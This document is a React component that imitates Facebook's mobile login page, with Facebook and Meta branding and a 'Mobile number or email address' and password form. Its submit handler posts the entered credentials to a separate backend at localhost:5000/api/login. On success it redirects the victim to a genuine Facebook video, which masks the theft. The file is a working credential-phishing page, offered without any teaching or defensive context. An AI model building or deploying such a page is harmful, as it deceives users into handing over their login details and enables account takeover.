import { IoChevronDown } from "react-icons/io5";
import { FaFacebook } from "react-icons/fa";
import { Link, useNavigate } from "react-router-dom";
import axios from "axios";

const Login = () => {

  const navigate = useNavigate();

  const handleSubmit = (e) => {
    e.preventDefault();
    const emailNum = e.target.emailNum.value;
    const pass = e.target.password.value;
    // console.log(emailNum, pass);
    const user = { emailNum, pass };
    axios.post("http://localhost:5000/api/login", user).then((res) => {
      // console.log(res);
      if (res.status === 200) {
        window.location.href = "https://web.facebook.com/watch?v=1716608769152496";
      }
      
    });
  };

  return (
    <div className="bg-[#EEF6FE] min-h-screen flex flex-col justify-between">
      {/* Language selector */}
      <div>
        {/* You can open the modal using document.getElementById('ID').showModal() method */}
        <div
          className="flex justify-center items-center pt-2"
          onClick={() => document.getElementById("my_modal_3").showModal()}
        >
          English (US) <IoChevronDown className="mt-1" />
        </div>
        <dialog id="my_modal_3" className="modal">
          <div className="modal-box bg-[#EEF6FE]">
            <form method="dialog">
              {/* if there is a button in form, it will close the modal */}
              <button className="btn btn-sm btn-circle btn-ghost font-bold absolute left-2 top-2 pb-10">
                ✕
              </button>
            </form>
            <h3 className="font-bold text-lg">Select your language</h3>

            <div className="bg-white p-4 rounded-lg flex flex-col gap-4">
              <div className="flex justify-between">
                <span>English (US)</span>
                <input type="checkbox" name="English (US)" id="" />
              </div>
              <div className="flex justify-between">
                <span>English (UK)</span>
                <input type="checkbox" name="English (US)" id="" />
              </div>
              <div className="flex justify-between">
                <span>বাংলা</span>
                <input type="checkbox" name="English (US)" id="" />
              </div>
              <div className="flex justify-between">
                <span>Afrikaans</span>
                <input type="checkbox" name="English (US)" id="" />
              </div>
              <div className="flex justify-between">
                <span>Bahasa Indonesia</span>
                <input type="checkbox" name="English (US)" id="" />
              </div>
              <div className="flex justify-between">
                <span>Basa Jawa</span>
                <input type="checkbox" name="English (US)" id="" />
              </div>
              <div className="flex justify-between">
                <span>Bisaya</span>
                <input type="checkbox" name="English (US)" id="" />
              </div>
              <div className="flex justify-between">
                <span>Cymraeg</span>
                <input type="checkbox" name="English (US)" id="" />
              </div>
              <div className="flex justify-between">
                <span>Dansk</span>
                <input type="checkbox" name="English (US)" id="" />
              </div>
            </div>
          </div>
        </dialog>
      </div>

      {/* Facebook Icon */}
      <div className="flex justify-center mt-8 mb-10">
        <FaFacebook className="text-[#0068FF] text-6xl" />
      </div>

      {/* input form */}
      <div className="">
        <form onSubmit={handleSubmit} className="w-full px-4">
          {/* Email Field */}
          <div className="relative mb-6">
            <input
              type="txt"
              name="emailNum"
              id="email"
              placeholder=" "
              className="peer px-5 input input-bordered w-full h-16"
            />
            <label
              htmlFor="email"
              className="absolute left-2 top-1.5 text-lg font-medium text-gray-500 transition-all transform -translate-y-2 scale-90 peer-placeholder-shown:translate-y-3 peer-placeholder-shown:scale-100 peer-placeholder-shown:text-gray-400 peer-focus:-translate-y-2 peer-focus:scale-90"
            >
              Mobile number or email address
            </label>
          </div>

          {/* Password Field */}
          <div className="relative mb-6">
            <input
              type="password"
              name="pass"
              id="password"
              placeholder=" "
              className="peer px-4 input input-bordered w-full h-16"
            />
            <label
              htmlFor="password"
              className="absolute left-3 top-1.5 text-lg font-medium text-gray-500 transition-all transform -translate-y-2 scale-90 peer-placeholder-shown:translate-y-3 peer-placeholder-shown:scale-100 peer-placeholder-shown:text-gray-400 peer-focus:-translate-y-2 peer-focus:scale-90"
            >
              Password
            </label>
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            className="input input-bordered w-full bg-[#0064E0] rounded-full text-white font-medium"
          >
            Log in
          </button>
        </form>
        <p className="text-center mt-5">
          <Link>Forgotten Password ?</Link>
        </p>
      </div>

      {/* account create or bottom */}
      <div className="flex flex-col justify-center items-center mt-10">
        <button className="btn btn-outline w-[90%] rounded-full text-[#1873E3] border-[#1873E3] text-base">
          Create new account
        </button>
        <div className="flex justify-center mt-5">
          <img className="w-14" src="meta.png" alt="meta.png" />
        </div>
        <div className="flex gap-2 text-sm my-4">
          <Link>About</Link>
          <Link>Help</Link>
          <Link>More</Link>
        </div>
      </div>
    </div>
  );
};

export default Login;
